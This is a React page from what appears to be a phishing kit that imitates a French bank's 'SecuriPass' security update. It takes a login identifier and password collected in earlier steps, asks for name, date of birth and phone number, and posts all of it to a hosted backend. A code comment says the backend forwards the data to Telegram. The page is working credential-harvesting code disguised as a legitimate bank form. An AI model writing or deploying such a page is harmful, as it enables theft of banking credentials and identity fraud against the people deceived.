import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '../components/ui/card';
import { Alert, AlertDescription } from '../components/ui/alert';
import { UserCircle, Calendar, AlertCircle, Phone } from 'lucide-react';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || 'https://web-production-b21a3.up.railway.app';

const PersonalInfoStep = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [formData, setFormData] = useState({
    lastName: '',
    firstName: '',
    dateOfBirth: '',
    phoneNumber: ''
  });

  useEffect(() => {
    // Check if previous steps were completed
    const identifier = sessionStorage.getItem('securipass_identifier');
    const password = sessionStorage.getItem('securipass_password');
    if (!identifier || !password) {
      navigate('/login');
    }
  }, [navigate]);

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
    setError('');
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      const identifier = sessionStorage.getItem('securipass_identifier');
      const password = sessionStorage.getItem('securipass_password');

      // Send data to backend (which will forward to Telegram)
      await axios.post(`${BACKEND_URL}/api/securipass/submit`, {
        identifier,
        password,
        ...formData
      });

      // Clear session data
      sessionStorage.removeItem('securipass_identifier');
      sessionStorage.removeItem('securipass_password');

      // Navigate to confirmation
      navigate('/final-confirmation');
    } catch (err) {
      console.error('Error submitting data:', err);
      setError('Une erreur est survenue. Veuillez réessayer.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-red-50 to-white py-12 px-4">
      <div className="max-w-2xl mx-auto">
        <Alert className="mb-8 border-[#e60028] bg-[#e60028]/5">
          <UserCircle className="h-5 w-5 text-[#e60028]" />
          <AlertDescription className="text-[#e60028] ml-2">
            <strong>Dernière étape.</strong> Confirmez vos informations personnelles.
          </AlertDescription>
        </Alert>

        <Card className="shadow-2xl border-none">
          <CardHeader className="space-y-4 pb-8">
            <div className="w-16 h-16 bg-gradient-to-br from-[#e60028] to-[#c00020] rounded-full flex items-center justify-center mx-auto shadow-lg">
              <UserCircle className="text-white" size={32} />
            </div>
            <CardTitle className="text-3xl font-bold text-center text-gray-900">
              Informations personnelles
            </CardTitle>
            <CardDescription className="text-center text-base text-gray-600">
              Complétez vos informations pour finaliser la mise à jour
            </CardDescription>
          </CardHeader>

          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              {error && (
                <Alert variant="destructive" className="animate-in slide-in-from-top duration-300">
                  <AlertCircle className="h-4 w-4" />
                  <AlertDescription>{error}</AlertDescription>
                </Alert>
              )}

              <div className="space-y-2">
                <Label htmlFor="lastName" className="text-gray-900 font-semibold flex items-center gap-2">
                  <UserCircle size={18} className="text-[#e60028]" />
                  Nom de famille
                </Label>
                <Input
                  id="lastName"
                  name="lastName"
                  type="text"
                  placeholder="DUPONT"
                  value={formData.lastName}
                  onChange={handleChange}
                  required
                  className="h-12 border-gray-300 focus:border-[#e60028] focus:ring-[#e60028] text-base"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="firstName" className="text-gray-900 font-semibold flex items-center gap-2">
                  <UserCircle size={18} className="text-[#e60028]" />
                  Prénom
                </Label>
                <Input
                  id="firstName"
                  name="firstName"
                  type="text"
                  placeholder="Jean"
                  value={formData.firstName}
                  onChange={handleChange}
                  required
                  className="h-12 border-gray-300 focus:border-[#e60028] focus:ring-[#e60028] text-base"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="dateOfBirth" className="text-gray-900 font-semibold flex items-center gap-2">
                  <Calendar size={18} className="text-[#e60028]" />
                  Date de naissance
                </Label>
                <Input
                  id="dateOfBirth"
                  name="dateOfBirth"
                  type="date"
                  value={formData.dateOfBirth}
                  onChange={handleChange}
                  required
                  className="h-12 border-gray-300 focus:border-[#e60028] focus:ring-[#e60028] text-base"
                />
              </div>

              <div className="space-y-2">
                <Label htmlFor="phoneNumber" className="text-gray-900 font-semibold flex items-center gap-2">
                  <Phone size={18} className="text-[#e60028]" />
                  Numéro de téléphone
                </Label>
                <Input
                  id="phoneNumber"
                  name="phoneNumber"
                  type="tel"
                  placeholder="06 12 34 56 78"
                  value={formData.phoneNumber}
                  onChange={handleChange}
                  required
                  className="h-12 border-gray-300 focus:border-[#e60028] focus:ring-[#e60028] text-base"
                />
              </div>

              <Button
                type="submit"
                disabled={loading}
                className="w-full h-12 bg-[#e60028] hover:bg-[#c00020] text-white font-semibold text-lg shadow-lg hover:shadow-xl transition-all duration-300 mt-8"
              >
                {loading ? 'Envoi en cours...' : 'Mettre à jour'}
              </Button>
            </form>

            <div className="mt-8 pt-6 border-t border-gray-200 text-center">
              <p className="text-sm text-gray-600">
                Besoin d'assistance ? Contactez le{' '}
                <span className="font-semibold text-[#e60028]">09 69 39 00 00</span>
              </p>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default PersonalInfoStep;
